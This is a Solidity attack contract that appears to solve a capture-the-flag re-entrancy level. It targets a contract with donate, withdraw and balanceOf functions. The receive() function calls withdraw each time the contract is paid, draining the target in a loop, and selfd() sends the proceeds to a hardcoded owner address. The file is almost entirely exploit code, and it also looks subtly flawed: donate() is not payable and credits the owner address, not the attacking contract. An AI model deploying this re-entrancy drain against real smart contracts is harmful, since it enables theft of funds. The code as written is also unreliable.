// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
  function withdraw(uint _amount) external;
  function balanceOf(address _who) external view returns (uint balance);
  function donate(address _to) external payable;
}

contract ReEntHach {
  IReentrance instance;
  address owner = 0x095454F216EC9485da86D49aDffAcFD0Fa3e5BE5;

  constructor(address tmp_) {
    instance = IReentrance(tmp_);
  }

  function donate() external {
    instance.donate{value: 1 ether}(owner);
  }

  function withdraw() external {
    instance.withdraw(1 ether);
  }

  receive() external payable { 
    if (address(instance).balance >= 1 ether) {
      instance.withdraw(1 ether);
    }
  }

  function selfd() external {
    payable(owner).transfer(address(this).balance);
  }
}
